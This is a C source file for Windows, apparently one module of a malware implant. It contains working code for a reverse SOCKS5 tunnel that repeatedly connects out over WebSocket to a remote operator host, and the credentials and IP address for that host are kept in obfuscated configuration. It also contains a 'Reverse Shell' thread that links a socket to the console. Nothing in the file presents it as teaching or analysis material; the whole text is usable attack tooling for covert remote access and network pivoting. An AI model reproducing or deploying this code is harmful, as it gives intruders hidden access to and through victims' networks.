#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wincrypt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include "proxy.h"
#include "obfuscate.h"
#include "config.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Crypt32.lib")

typedef struct _SOCKS5_SERVER_REV SOCKS5_SERVER_REV;
static SOCKS5_SERVER_REV *g_socks5_server = NULL;
static BOOL use_websocket = FALSE;

// recv/send
#define TRANSPORT_RECV(s, buf, l) \
    (use_websocket ? ws_recv((s), (buf), (l)) : recv((s), (buf), (l), 0))

#define TRANSPORT_SEND(s, buf, l) \
    (use_websocket ? ws_send((s), (buf), (l)) : send((s), (buf), (l), 0))

// WebSocket handshake
static int websocket_handshake(SOCKET s) {
    char buf[4096], key[256], accept_key[512];
    int len = recv(s, buf, sizeof(buf)-1, 0);
    if (len <= 0) return -1;
    buf[len] = '\0';
    char *p = strstr(buf, "Sec-WebSocket-Key:");
    if (!p) return -1;
    p += strlen("Sec-WebSocket-Key:");
    while (*p == ' ') p++;
    int i = 0;
    while (*p != '\r' && *p != '\n' && i < (int)sizeof(key)-1) {
        key[i++] = *p++;
    }
    key[i] = '\0';

    const char *magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    char concat[512];
    snprintf(concat, sizeof(concat), "%s%s", key, magic);

    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE sha[20];
    DWORD shaLen = sizeof(sha);
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) return -1;
    if (!CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) { CryptReleaseContext(hProv,0); return -1; }
    if (!CryptHashData(hHash, (BYTE*)concat, (DWORD)strlen(concat), 0)) goto fail;
    if (!CryptGetHashParam(hHash, HP_HASHVAL, sha, &shaLen, 0)) goto fail;

    DWORD outLen = sizeof(accept_key);
    if (!CryptBinaryToStringA(sha, shaLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, accept_key, &outLen)) goto fail;

    {
        char resp[512];
        int r = snprintf(resp, sizeof(resp),
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Accept: %s\r\n"
            "\r\n",
            accept_key);
        send(s, resp, r, 0);
    }

    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return 0;

fail:
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    return -1;
}

static int ws_client_handshake(SOCKET s, const char *path, const char *host, USHORT port) {
    BYTE rnd[16];
    CHAR key_b64[64], expected[64];
    DWORD klen = sizeof(key_b64), elen = sizeof(expected);
    CHAR req[512], resp[4096];
    int rlen;

    CryptGenRandom(0, sizeof(rnd), rnd);
    CryptBinaryToStringA(rnd, sizeof(rnd),
                        CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF,
                        key_b64, &klen);

    snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s:%hu\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: %s\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n",
        path, host, port, key_b64);
    if (send(s, req, (int)strlen(req), 0) == SOCKET_ERROR) return -1;

    rlen = recv(s, resp, sizeof(resp)-1, 0);
    if (rlen <= 0) return -1;
    resp[rlen] = '\0';
    if (!strstr(resp, "HTTP/1.1 101")) return -1;

    // Sec-WebSocket-Accept
    {
        const char *magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
        CHAR concat[256];
        BYTE sha[20]; DWORD shaLen = sizeof(sha);
        HCRYPTPROV hProv = 0; HCRYPTHASH hHash = 0;
        snprintf(concat, sizeof(concat), "%s%s", key_b64, magic);
        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
        CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash);
        CryptHashData(hHash, (BYTE*)concat, (DWORD)strlen(concat), 0);
        CryptGetHashParam(hHash, HP_HASHVAL, sha, &shaLen, 0);
        CryptBinaryToStringA(sha, shaLen,
                             CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF,
                             expected, &elen);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
    }
    return strstr(resp, expected) ? 0 : -1;
}

// чтение WebSocket фрейма
static int ws_recv(SOCKET s, char *out, int maxlen) {
    uint8_t hdr[2];
    if (recv(s, (char*)hdr, 2, 0) != 2) return -1;
    int masked = hdr[1] & 0x80;
    uint64_t plen = hdr[1] & 0x7F;
    if (plen == 126) {
        uint16_t ext; recv(s, (char*)&ext, 2, 0);
        plen = ntohs(ext);
    } else if (plen == 127) {
        uint64_t ext; recv(s, (char*)&ext, 8, 0);
        plen = _byteswap_uint64(ext);
    }
    uint8_t mask[4] = {0};
    if (masked) recv(s, (char*)mask, 4, 0);
    if (plen > (uint64_t)maxlen) return -1;
    recv(s, out, (int)plen, 0);
    if (masked) {
        for (uint64_t i = 0; i < plen; i++) {
            out[i] ^= mask[i & 3];
        }
    }
    return (int)plen;
}

// отправка WebSocket фрейма
static int ws_send(SOCKET s, const char *data, int len) {
    uint8_t hdr[10];
    int hdrlen = 0;
    hdr[0] = 0x82;
    if (len < 126) {
        hdr[1] = len;
        hdrlen = 2;
    } else if (len < 0x10000) {
        hdr[1] = 126;
        *(uint16_t*)(hdr + 2) = htons((uint16_t)len);
        hdrlen = 4;
    } else {
        hdr[1] = 127;
        *(uint64_t*)(hdr + 2) = _byteswap_uint64((uint64_t)len);
        hdrlen = 10;
    }
    send(s, (char*)hdr, hdrlen, 0);
    return send(s, data, len, 0);
}

static void PrintError(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    fprintf(stderr, "[ERROR] ");
    vfprintf(stderr, fmt, args);
    fprintf(stderr, "\n");
    fflush(stderr);
    va_end(args);
}

static void PrintInfo(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    printf("[INFO] ");
    vfprintf(stdout, fmt, args);
    printf("\n");
    fflush(stdout);
    va_end(args);
}

//  Reverse Shell
DWORD WINAPI PumpSockToConsole(LPVOID p) {
    SOCKET s = (SOCKET)p;
    CHAR buf[4096];
    int n;
    while ((n = TRANSPORT_RECV(s, buf, sizeof(buf))) > 0) {
        WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), buf, n, NULL, NULL);
    }
    return 0;
}

DWORD WINAPI PumpConsoleToSock(LPVOID p) {
    SOCKET s = *(SOCKET*)p;
    CHAR buf[4096];
    DWORD n;
    while (ReadFile(GetStdHandle(STD_INPUT_HANDLE), buf, sizeof(buf), &n, NULL) && n) {
        TRANSPORT_SEND(s, buf, n);
    }
    return 0;
}

DWORD WINAPI ReverseShellServerThread(LPVOID param) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        PrintError("WSAStartup failed for reverse shell");
        return 1;
    }

    SOCKET lst = socket(AF_INET, SOCK_STREAM, 0);
    if (lst == INVALID_SOCKET) {
        PrintError("socket() failed for reverse shell, WSAError=%d", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons((u_short)RSHELL_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(lst, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        PrintError("bind() failed for reverse shell, WSAError=%d", WSAGetLastError());
        closesocket(lst);
        WSACleanup();
        return 1;
    }

    if (listen(lst, 1) == SOCKET_ERROR) {
        PrintError("listen() failed for reverse shell, WSAError=%d", WSAGetLastError());
        closesocket(lst);
        WSACleanup();
        return 1;
    }

    printf("[*] Waiting for reverse shell on port %d ...\n", RSHELL_PORT);
    SOCKET s = accept(lst, NULL, NULL);
    if (s == INVALID_SOCKET) {
        PrintError("accept() failed for reverse shell, WSAError=%d", WSAGetLastError());
        closesocket(lst);
        WSACleanup();
        return 1;
    }
    printf("[+] Connection established!\n");

    use_websocket = TRUE;
    if (websocket_handshake(s) != 0) {
        closesocket(s);
        closesocket(lst);
        WSACleanup();
        return 1;
    }

    CreateThread(NULL, 0, PumpSockToConsole, (LPVOID)s,   0, NULL);
    SOCKET prm = s;
    CreateThread(NULL, 0, PumpConsoleToSock, &prm,        0, NULL);
    WaitForSingleObject(GetCurrentThread(), INFINITE);

    closesocket(s);
    closesocket(lst);
    WSACleanup();
    return 0;
}

// Reverse SOCKS5 Client 
#define SOCKS5_VERSION          0x05
#define AUTH_METHOD_NO_AUTH     0x00
#define AUTH_METHOD_USERPASS    0x02
#define AUTH_METHOD_NO_ACCEPT   0xFF
#define AUTH_VERSION_USERPASS   0x01
#define SOCKS_CMD_CONNECT       0x01
#define SOCKS_CMD_BIND          0x02
#define SOCKS_CMD_UDP_ASSOCIATE 0x03
#define SOCKS_ADDR_IPV4         0x01
#define SOCKS_ADDR_DOMAIN       0x03
#define SOCKS_ADDR_IPV6         0x04

typedef struct _SOCKS5_SERVER_REV {
    USHORT remote_port;
    char   remote_ip[256];
    HANDLE shutdown_event;
    HANDLE thread_handle;
    char   login[256];
    char   password[256];
} SOCKS5_SERVER_REV;

typedef struct _SOCKS5_CLIENT {
    SOCKET client_socket;
    SOCKS5_SERVER_REV* server;
    struct sockaddr_storage client_addr;
    int client_addr_len;
} SOCKS5_CLIENT;

static int ReadExact(SOCKET sock, char* buffer, int len) {
    int total = 0, n;
    while (total < len) {
        n = TRANSPORT_RECV(sock, buffer + total, len - total);
        if (n <= 0) {
            PrintError("ReadExact failed (recv=%d), WSAError=%d", n, WSAGetLastError());
            return -1;
        }
        total += n;
    }
    PrintInfo("ReadExact: read %d bytes", total);
    return total;
}

static int SendAll(SOCKET sock, const char* buffer, int len) {
    int total = 0, n;
    while (total < len) {
        n = TRANSPORT_SEND(sock, buffer + total, len - total);
        if (n == SOCKET_ERROR || n < 0) {
            PrintError("SendAll failed, WSAError=%d", WSAGetLastError());
            return -1;
        }
        total += n;
    }
    PrintInfo("SendAll: sent %d bytes", total);
    return total;
}

static BOOL SendSocksReply(SOCKET sock, UCHAR rep, const struct sockaddr* bnd_addr, int bnd_addr_len) {
    char reply[256];
    int offset = 0;
    reply[offset++] = SOCKS5_VERSION;
    reply[offset++] = rep;
    reply[offset++] = 0x00;
    if (bnd_addr && bnd_addr->sa_family == AF_INET) {
        reply[offset++] = SOCKS_ADDR_IPV4;
        struct sockaddr_in* sin = (struct sockaddr_in*)bnd_addr;
        memcpy(reply + offset, &sin->sin_addr, 4); offset += 4;
        memcpy(reply + offset, &sin->sin_port, 2); offset += 2;
    } else if (bnd_addr && bnd_addr->sa_family == AF_INET6) {
        reply[offset++] = SOCKS_ADDR_IPV6;
        struct sockaddr_in6* sin6 = (struct sockaddr_in6*)bnd_addr;
        memcpy(reply + offset, &sin6->sin6_addr, 16); offset += 16;
        memcpy(reply + offset, &sin6->sin6_port, 2);  offset += 2;
    } else {
        reply[offset++] = SOCKS_ADDR_IPV4;
        memset(reply + offset, 0, 6); offset += 6;
    }
    if (SendAll(sock, reply, offset) != offset) return FALSE;
    PrintInfo("SendSocksReply: REP=%d", rep);
    return TRUE;
}

static BOOL ReadSocksAddress(SOCKET sock, UCHAR atyp, struct sockaddr_storage* addr, int* addr_len) {
    memset(addr, 0, sizeof(*addr));
    if (atyp == SOCKS_ADDR_IPV4) {
        struct sockaddr_in* sin = (struct sockaddr_in*)addr;
        sin->sin_family = AF_INET;
        if (ReadExact(sock, (char*)&sin->sin_addr, 4) != 4) return FALSE;
        if (ReadExact(sock, (char*)&sin->sin_port, 2) != 2) return FALSE;
        *addr_len = sizeof(*sin);
        PrintInfo("ReadSocksAddress: IPv4");
        return TRUE;
    } else if (atyp == SOCKS_ADDR_IPV6) {
        struct sockaddr_in6* sin6 = (struct sockaddr_in6*)addr;
        sin6->sin6_family = AF_INET6;
        if (ReadExact(sock, (char*)&sin6->sin6_addr, 16) != 16) return FALSE;
        if (ReadExact(sock, (char*)&sin6->sin6_port, 2) != 2) return FALSE;
        *addr_len = sizeof(*sin6);
        PrintInfo("ReadSocksAddress: IPv6");
        return TRUE;
    } else if (atyp == SOCKS_ADDR_DOMAIN) {
        UCHAR dlen;
        if (ReadExact(sock, (char*)&dlen, 1) != 1) return FALSE;
        char domain[256];
        if (dlen >= sizeof(domain)) return FALSE;
        if (ReadExact(sock, domain, dlen) != dlen) return FALSE;
        domain[dlen] = '\0';
        uint16_t port_net;
        if (ReadExact(sock, (char*)&port_net, 2) != 2) return FALSE;
        struct addrinfo hints = {0}, *res = NULL;
        hints.ai_family   = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        char portStr[6];
        _snprintf(portStr, sizeof(portStr), "%hu", port_net);
        if (getaddrinfo(domain, portStr, &hints, &res) != 0 || !res) {
            PrintError("getaddrinfo(%s) failed", domain);
            return FALSE;
        }
        memcpy(addr, res->ai_addr, res->ai_addrlen);
        *addr_len = (int)res->ai_addrlen;
        freeaddrinfo(res);
        PrintInfo("ReadSocksAddress: Domain %s", domain);
        return TRUE;
    }
    return FALSE;
}

static void TcpRelay(SOCKET s1, SOCKET s2) {
    char buffer[4096];
    fd_set read_fds;
    int maxfd = (int)((s1 > s2 ? s1 : s2));
    PrintInfo("TcpRelay: %d <-> %d", s1, s2);
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(s1, &read_fds);
        FD_SET(s2, &read_fds);
        struct timeval tv = {1,0};
        int activity = select(maxfd+1, &read_fds, NULL, NULL, &tv);
        if (activity < 0) {
            PrintError("select() failed");
            break;
        }
        if (FD_ISSET(s1, &read_fds)) {
            int n = TRANSPORT_RECV(s1, buffer, sizeof(buffer));
            if (n <= 0) break;
            TRANSPORT_SEND(s2, buffer, n);
        }
        if (FD_ISSET(s2, &read_fds)) {
            int n = TRANSPORT_RECV(s2, buffer, sizeof(buffer));
            if (n <= 0) break;
            TRANSPORT_SEND(s1, buffer, n);
        }
    }
    closesocket(s1);
    closesocket(s2);
    PrintInfo("TcpRelay: done");
}

typedef struct _UDP_RELAY {
    SOCKET udp_socket;
    SOCKS5_CLIENT* client;
    struct sockaddr_storage client_udp_addr;
    int client_udp_addr_set;
} UDP_RELAY;

static DWORD WINAPI UDPRelayThread(LPVOID param) {
    UDP_RELAY* relay = (UDP_RELAY*)param;
    char buffer[65536];
    PrintInfo("UDPRelayThread: start");
    while (1) {
        struct sockaddr_storage src_addr;
        int addr_len = sizeof(src_addr);
        int n = recvfrom(relay->udp_socket, buffer, sizeof(buffer), 0,
            (struct sockaddr*)&src_addr, &addr_len);
        if (n <= 0) break;
        if (buffer[0] || buffer[1] || buffer[2]) continue;
        UCHAR atyp = buffer[3];
        int header_len = 0, data_len = 0;
        struct sockaddr_storage dest_addr;
        int dest_addr_len = 0;
        memset(&dest_addr, 0, sizeof(dest_addr));

        if (atyp == SOCKS_ADDR_IPV4) {
            header_len = 4 + 4 + 2;
            if (n < header_len) continue;
            struct sockaddr_in* sin = (struct sockaddr_in*)&dest_addr;
            sin->sin_family = AF_INET;
            memcpy(&sin->sin_addr, buffer + 4, 4);
            memcpy(&sin->sin_port, buffer + 8, 2);
            dest_addr_len = sizeof(*sin);
        }
        else if (atyp == SOCKS_ADDR_IPV6) {
            header_len = 4 + 16 + 2;
            if (n < header_len) continue;
            struct sockaddr_in6* sin6 = (struct sockaddr_in6*)&dest_addr;
            sin6->sin6_family = AF_INET6;
            memcpy(&sin6->sin6_addr, buffer + 4, 16);
            memcpy(&sin6->sin6_port, buffer + 20, 2);
            dest_addr_len = sizeof(*sin6);
        }
        else if (atyp == SOCKS_ADDR_DOMAIN) {
            UCHAR dlen = buffer[4];
            header_len = 4 + 1 + dlen + 2;
            if (n < header_len) continue;
            char domain[256];
            memcpy(domain, buffer + 5, dlen);
            domain[dlen] = 0;
            uint16_t port_net;
            memcpy(&port_net, buffer + 5 + dlen, 2);

            struct addrinfo hints = { 0 }, * res = NULL;
            hints.ai_family = AF_UNSPEC;
            hints.ai_socktype = SOCK_DGRAM;
            if (getaddrinfo(domain, NULL, &hints, &res) || !res) continue;

            memcpy(&dest_addr, res->ai_addr, res->ai_addrlen);
            dest_addr_len = (int)res->ai_addrlen; 
            freeaddrinfo(res);

            if (dest_addr.ss_family == AF_INET)
                ((struct sockaddr_in*)&dest_addr)->sin_port = port_net;
            else if (dest_addr.ss_family == AF_INET6)
                ((struct sockaddr_in6*)&dest_addr)->sin6_port = port_net;
        }
        else {
            continue;
        }

        data_len = n - header_len;
        char* data = buffer + header_len;

        if (!relay->client_udp_addr_set) {
            memcpy(&relay->client_udp_addr, &src_addr, addr_len);
            relay->client_udp_addr_set = 1;
            PrintInfo("UDPRelayThread: client addr set");
        }

        sendto(relay->udp_socket, data, data_len, 0,
            (struct sockaddr*)&dest_addr, dest_addr_len);
        PrintInfo("UDPRelayThread: relayed %d bytes", data_len);
    }

    closesocket(relay->udp_socket);
    free(relay);
    PrintInfo("UDPRelayThread: exit");
    return 0;
}


static BOOL HandleConnect(SOCKS5_CLIENT* client) {
    UCHAR reserved, atyp;
    if (ReadExact(client->client_socket, (char*)&reserved, 1) != 1) return FALSE;
    if (ReadExact(client->client_socket, (char*)&atyp,     1) != 1) return FALSE;
    struct sockaddr_storage dest_addr;
    int dest_addr_len = 0;
    if (!ReadSocksAddress(client->client_socket, atyp, &dest_addr, &dest_addr_len))
        return FALSE;
    SOCKET remote_sock = socket(dest_addr.ss_family, SOCK_STREAM, IPPROTO_TCP);
    if (remote_sock == INVALID_SOCKET) return FALSE;
    if (connect(remote_sock, (struct sockaddr*)&dest_addr, dest_addr_len) == SOCKET_ERROR) {
        SendSocksReply(client->client_socket, 0x05, NULL, 0);
        closesocket(remote_sock);
        return FALSE;
    }
    struct sockaddr_storage local_addr;
    int local_addr_len = sizeof(local_addr);
    getsockname(remote_sock, (struct sockaddr*)&local_addr, &local_addr_len);
    if (!SendSocksReply(client->client_socket, 0x00,
                        (struct sockaddr*)&local_addr, local_addr_len)) {
        closesocket(remote_sock);
        return FALSE;
    }
    TcpRelay(client->client_socket, remote_sock);
    return TRUE;
}

static BOOL HandleBind(SOCKS5_CLIENT* client) {
    UCHAR reserved, atyp;
    if (ReadExact(client->client_socket, (char*)&reserved, 1) != 1) return FALSE;
    if (ReadExact(client->client_socket, (char*)&atyp,     1) != 1) return FALSE;
    if (atyp == SOCKS_ADDR_IPV4) { char dummy[4]; ReadExact(client->client_socket, dummy, 4); }
    else if (atyp == SOCKS_ADDR_IPV6) { char dummy[16]; ReadExact(client->client_socket, dummy, 16); }
    else if (atyp == SOCKS_ADDR_DOMAIN) {
        UCHAR dlen; ReadExact(client->client_socket, (char*)&dlen, 1);
        char dummy[256]; ReadExact(client->client_socket, dummy, dlen);
    }
    { char dummy[2]; ReadExact(client->client_socket, dummy, 2); }
    SOCKET bind_sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (bind_sock == INVALID_SOCKET)
        bind_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (bind_sock == INVALID_SOCKET) return FALSE;
    { int off = 0; setsockopt(bind_sock, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&off, sizeof(off)); }
    struct sockaddr_in6 sin6 = {0};
    sin6.sin6_family = AF_INET6;
    sin6.sin6_addr = in6addr_any;
    sin6.sin6_port = 0;
    if (bind(bind_sock, (struct sockaddr*)&sin6, sizeof(sin6)) == SOCKET_ERROR) {
        closesocket(bind_sock);
        return FALSE;
    }
    listen(bind_sock, 1);
    struct sockaddr_storage bnd_addr;
    int bnd_addr_len = sizeof(bnd_addr);
    getsockname(bind_sock, (struct sockaddr*)&bnd_addr, &bnd_addr_len);
    if (!SendSocksReply(client->client_socket, 0x00,
                        (struct sockaddr*)&bnd_addr, bnd_addr_len)) {
        closesocket(bind_sock);
        return FALSE;
    }
    SOCKET incoming = accept(bind_sock, NULL, NULL);
    closesocket(bind_sock);
    if (incoming == INVALID_SOCKET) return FALSE;
    struct sockaddr_storage peer;
    int peer_len = sizeof(peer);
    getpeername(incoming, (struct sockaddr*)&peer, &peer_len);
    SendSocksReply(client->client_socket, 0x00,
                  (struct sockaddr*)&peer, peer_len);
    TcpRelay(client->client_socket, incoming);
    return TRUE;
}

static BOOL HandleUdpAssociate(SOCKS5_CLIENT* client) {
    UCHAR reserved, atyp;
    if (ReadExact(client->client_socket, (char*)&reserved, 1) != 1) return FALSE;
    if (ReadExact(client->client_socket, (char*)&atyp,     1) != 1) return FALSE;
    if (atyp == SOCKS_ADDR_IPV4) { char dummy[4]; ReadExact(client->client_socket, dummy, 4); }
    else if (atyp == SOCKS_ADDR_IPV6) { char dummy[16]; ReadExact(client->client_socket, dummy, 16); }
    else if (atyp == SOCKS_ADDR_DOMAIN) {
        UCHAR dlen; ReadExact(client->client_socket, (char*)&dlen, 1);
        char dummy[256]; ReadExact(client->client_socket, dummy, dlen);
    }
    { char dummy[2]; ReadExact(client->client_socket, dummy, 2); }
    SOCKET udp_sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (udp_sock == INVALID_SOCKET)
        udp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udp_sock == INVALID_SOCKET) return FALSE;
    { int off = 0; setsockopt(udp_sock, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&off, sizeof(off)); }
    struct sockaddr_in6 sin6 = {0};
    sin6.sin6_family = AF_INET6;
    sin6.sin6_addr = in6addr_any;
    sin6.sin6_port = 0;
    bind(udp_sock, (struct sockaddr*)&sin6, sizeof(sin6));
    struct sockaddr_storage udp_addr;
    int udp_addr_len = sizeof(udp_addr);
    getsockname(udp_sock, (struct sockaddr*)&udp_addr, &udp_addr_len);
    SendSocksReply(client->client_socket, 0x00,
                  (struct sockaddr*)&udp_addr, udp_addr_len);
    UDP_RELAY* relay = malloc(sizeof(*relay));
    relay->udp_socket = udp_sock;
    relay->client = client;
    relay->client_udp_addr_set = 0;
    CreateThread(NULL, 0, UDPRelayThread, relay, 0, NULL);
    return TRUE;
}

static BOOL Authenticate(SOCKS5_CLIENT* client) {
    UCHAR greeting[3] = { SOCKS5_VERSION, 1, AUTH_METHOD_USERPASS };
    if (SendAll(client->client_socket, (char*)greeting, 3) != 3) return FALSE;
    UCHAR resp[2];
    if (ReadExact(client->client_socket, (char*)resp, 2) != 2 || resp[1] != AUTH_METHOD_USERPASS)
        return FALSE;
    UCHAR ulen = (UCHAR)strlen(client->server->login);
    UCHAR plen = (UCHAR)strlen(client->server->password);
    char auth[512];
    int total = 0;
    auth[total++] = AUTH_VERSION_USERPASS;
    auth[total++] = ulen;
    memcpy(auth+total, client->server->login, ulen); total += ulen;
    auth[total++] = plen;
    memcpy(auth+total, client->server->password, plen); total += plen;
    if (SendAll(client->client_socket, auth, total) != total) return FALSE;
    if (ReadExact(client->client_socket, (char*)resp, 2) != 2 || resp[1] != 0x00) return FALSE;
    PrintInfo("Authenticate: OK");
    return TRUE;
}

static DWORD WINAPI ClientHandlerThread(LPVOID param) {
    SOCKS5_CLIENT* client = (SOCKS5_CLIENT*)param;
    __try {
        if (!Authenticate(client)) { PrintError("Auth failed"); goto cleanup; }
        UCHAR header[4];
        if (ReadExact(client->client_socket, (char*)header, 4) != 4) goto cleanup;
        if (header[0] != SOCKS5_VERSION) { PrintError("Bad ver"); goto cleanup; }
        switch (header[1]) {
            case SOCKS_CMD_CONNECT:        HandleConnect(client);      break;
            case SOCKS_CMD_BIND:           HandleBind(client);         break;
            case SOCKS_CMD_UDP_ASSOCIATE:  HandleUdpAssociate(client); break;
            default:
                SendSocksReply(client->client_socket, 0x07, NULL, 0);
                PrintError("Unsupported cmd %d", header[1]);
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        PrintError("Exception 0x%08X", GetExceptionCode());
    }
cleanup:
    closesocket(client->client_socket);
    free(client);
    PrintInfo("ClientHandlerThread: end");
    return 0;
}

static DWORD WINAPI ReverseClientThread(LPVOID param) {
    SOCKS5_SERVER_REV* server = (SOCKS5_SERVER_REV*)param;
    PrintInfo("ReverseClientThread: start");
    while (WaitForSingleObject(server->shutdown_event, 0) != WAIT_OBJECT_0) {
        struct addrinfo hints = {0}, *res = NULL;
        hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM;
        char portStr[6];
        _snprintf(portStr, sizeof(portStr), "%hu", server->remote_port);
        if (getaddrinfo(server->remote_ip, portStr, &hints, &res) != 0) {
            Sleep(5000);
            continue;
        }
        SOCKET sock = INVALID_SOCKET;
        for (struct addrinfo* ai = res; ai; ai = ai->ai_next) {
            sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
            if (sock == INVALID_SOCKET) continue;
            if (connect(sock, ai->ai_addr, (int)ai->ai_addrlen) == 0) break;
            closesocket(sock); sock = INVALID_SOCKET;
        }
        freeaddrinfo(res);
        if (sock == INVALID_SOCKET) { Sleep(5000); continue; }

       if (ws_client_handshake(sock, "/socks", server->remote_ip, server->remote_port) != 0) {
        PrintError("WS client handshake failed");
        closesocket(sock);
        Sleep(5000);
        continue;
       }
       use_websocket = TRUE;

        SOCKS5_CLIENT* client = malloc(sizeof(*client));
        client->client_socket = sock;
        client->server = server;
        HANDLE h = CreateThread(NULL, 0, ClientHandlerThread, client, 0, NULL);
        if (h) CloseHandle(h);
        Sleep(5000);
    }
    PrintInfo("ReverseClientThread: exiting");
    return 0;
}

static SOCKS5_SERVER_REV* StartReverseSocks5(const char* login, const char* password,
                                             const char* remote_ip, USHORT remote_port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        PrintError("WSAStartup failed for SOCKS");
        return NULL;
    }
    SOCKS5_SERVER_REV* server = calloc(1, sizeof(*server));
    if (!server) { WSACleanup(); return NULL; }
    server->remote_port = remote_port;
    strncpy(server->remote_ip, remote_ip, sizeof(server->remote_ip)-1);
    strncpy(server->login, login, sizeof(server->login)-1);
    strncpy(server->password, password, sizeof(server->password)-1);
    server->shutdown_event = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!server->shutdown_event) { free(server); WSACleanup(); return NULL; }
    server->thread_handle = CreateThread(NULL, 0, ReverseClientThread, server, 0, NULL);
    if (!server->thread_handle) {
        CloseHandle(server->shutdown_event);
        free(server);
        WSACleanup();
        return NULL;
    }
    PrintInfo("StartReverseSocks5: running to %s:%d", remote_ip, remote_port);
    return server;
}

static void StopReverseSocks5(SOCKS5_SERVER_REV* server) {
    if (!server) return;
    SetEvent(server->shutdown_event);
    WaitForSingleObject(server->thread_handle, 5000);
    CloseHandle(server->thread_handle);
    CloseHandle(server->shutdown_event);
    free(server);
    WSACleanup();
    PrintInfo("StopReverseSocks5: stopped");
}

HANDLE Proxy_Start(void) {
    const char *login    = obfuscate_get(SOCKS_LOGIN);
    const char *password = obfuscate_get(SOCKS_PASSWORD);
    const char *ip       = obfuscate_get(SOCKS_REMOTE_IP);
    USHORT      port     = SOCKS_REMOTE_PORT;

    g_socks5_server = StartReverseSocks5(login, password, ip, port);
    if (!g_socks5_server) return NULL;

    HANDLE hShell = CreateThread(NULL, 0, ReverseShellServerThread, NULL, 0, NULL);
    if (!hShell) {
        StopReverseSocks5(g_socks5_server);
        g_socks5_server = NULL;
        return NULL;
    }

    PrintInfo("Proxy module started: shell on port %d, socks-> %s:%d",
              RSHELL_PORT, ip, port);
    return hShell;
}

void Proxy_Stop(HANDLE shellThread) {
    if (g_socks5_server) {
        StopReverseSocks5(g_socks5_server);
        g_socks5_server = NULL;
    }

    if (shellThread) {
        TerminateThread(shellThread, 0);
        CloseHandle(shellThread);
    }

    PrintInfo("Proxy module stopped");
}
